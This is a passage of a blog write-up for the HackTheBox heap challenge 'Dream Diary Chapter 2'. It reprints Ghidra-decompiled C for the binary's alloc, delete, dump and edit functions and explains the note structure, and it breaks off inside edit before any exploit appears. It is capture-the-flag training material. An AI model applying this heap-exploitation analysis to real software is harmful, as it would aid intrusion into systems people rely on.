<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Dream Diary Chapter 2 - HTB" />
<meta name="author" content="Th3R4nd0m" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="#Recon" />
<meta property="og:description" content="#Recon" />
<link rel="canonical" href="https://blog.edmund.digital/2021/03/07/Dream_Diary_Chapter_2-HTB.html" />
<meta property="og:url" content="https://blog.edmund.digital/2021/03/07/Dream_Diary_Chapter_2-HTB.html" />
<meta property="og:site_name" content="Th3R4nd0m’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-03-07T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Dream Diary Chapter 2 - HTB" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"https://blog.edmund.digital/2021/03/07/Dream_Diary_Chapter_2-HTB.html","headline":"Dream Diary Chapter 2 - HTB","dateModified":"2021-03-07T00:00:00-05:00","datePublished":"2021-03-07T00:00:00-05:00","author":{"@type":"Person","name":"Th3R4nd0m"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.edmund.digital/2021/03/07/Dream_Diary_Chapter_2-HTB.html"},"description":"#Recon","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>
Dream Diary Chapter 2 - HTB - Th3R4nd0m&#39;s blog
  </title>

  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://blog.edmund.digital/feed.xml" title="Th3R4nd0m's blog" /><script async src="https://www.googletagmanager.com/gtag/js?id=UA-191452419-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-191452419-1');
</script></head><body></script>
<div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Th3R4nd0m&#39;s blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/TR4nd0m"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/Th3R4nd0m"><i class="fab fa-github-square"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="
            https://github.com/Th3R4nd0m.png
        " class="author-avatar" alt="Avatar" />
    
Hi. My second name is edmund. I like pentest, pwn and reverse engineering. Here I will be posting writeups for various challenges and HackTheBox machines.
</div>


<div class="post">
  <h1 class="post-title">Dream Diary Chapter 2 - HTB</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/heap/">heap</a>
      
      <a class="tag" href="/tag/pwn/">pwn</a>
      
  </div>
  
  <div class="post-date">Published on 07 Mar 2021</div>
  
  <p>#Recon</p>

<p>We load the binary in Ghidra and we decompile it. We take a look…and looks like it’s a heap challenge. We rename the obvious functions(main, edit, delete, alloc). We take a look at alloc:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">alloc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__size</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar3</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">number_of_notes</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">size_buf</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
  
  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">size_buf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">number_of_notes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">number_of_notes</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Too many notes!"</span><span class="p">);</span>
<span class="nl">LAB_00400af7:</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">__stack_chk_fail</span><span class="p">();</span>
      <span class="p">}</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Size: "</span><span class="p">);</span>
      <span class="n">sVar2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Read error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">);</span>
      <span class="n">__size</span> <span class="o">=</span> <span class="n">SEXT48</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
      <span class="n">pvVar3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
      <span class="n">pvVar3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="o">**</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">__size</span><span class="p">;</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
      <span class="n">read_wrapper</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="n">__size</span><span class="p">,</span>
                   <span class="n">__size</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LAB_00400af7</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">number_of_notes</span> <span class="o">=</span> <span class="n">number_of_notes</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It looks like we can allocate only 0xf notes. When we allocate a note, the program allocates a 0x10 sized chunk: <code class="language-plaintext highlighter-rouge">pvVar3 = malloc(0x10);</code>, it puts the pointer on bss <code class="language-plaintext highlighter-rouge">*(void **)(&amp;DAT_006020c0 + (long)number_of_notes * 8) = pvVar3;</code>, it allocates the desired chunk, and the pointer goes into the 0x10 sized chunk + 8 , and the size of our desired chunk into the 0x10 sized chunk:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
<span class="n">pvVar3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
<span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">pvVar3</span><span class="p">;</span>
<span class="o">**</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_006020c0</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">number_of_notes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">__size</span><span class="p">;</span>
</code></pre></div></div>

<p>So, we can define a struct for our note, and we set the bss “variable” to <code class="language-plaintext highlighter-rouge">note*[0xf]</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kt">void</span> <span class="nf">alloc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">sVar1</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__size</span><span class="p">;</span>
  <span class="n">note</span> <span class="o">*</span><span class="n">current_note</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">number_of_notes</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">size_buf</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
  
  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">size_buf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">number_of_notes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">number_of_notes</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Too many notes!"</span><span class="p">);</span>
<span class="nl">LAB_00400af7:</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">__stack_chk_fail</span><span class="p">();</span>
      <span class="p">}</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Size: "</span><span class="p">);</span>
      <span class="n">sVar1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar1</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Read error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_buf</span><span class="p">);</span>
      <span class="n">__size</span> <span class="o">=</span> <span class="n">SEXT48</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
      <span class="n">current_note</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
      <span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_note</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">current_note</span> <span class="o">=</span> <span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">];</span>
      <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
      <span class="n">current_note</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Malloc error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">__size</span><span class="p">;</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
      <span class="n">read_wrapper</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">number_of_notes</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="n">__size</span><span class="p">,</span><span class="n">__size</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LAB_00400af7</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">number_of_notes</span> <span class="o">=</span> <span class="n">number_of_notes</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Much better. Now the delete function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">index_</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">index</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
  <span class="n">index_</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">index_</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">index_</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bounds!"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Nope!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]);</span>
      <span class="n">notes</span><span class="p">[</span><span class="n">index_</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Nothing suspicious here. The <code class="language-plaintext highlighter-rouge">dump</code> function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">dump</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
  <span class="n">sVar2</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar2</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Read error!"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bounds!"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Nope!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %ld | Data: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Same thing. The <code class="language-plaintext highlighter-rouge">edit</code> function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">local_18</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bounds!"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">note</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Nope!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">);</span>
      <span class="n">read_wrapper</span><span class="p">(</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">notes</span><span class="p">[</span><span class="n">iVar1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
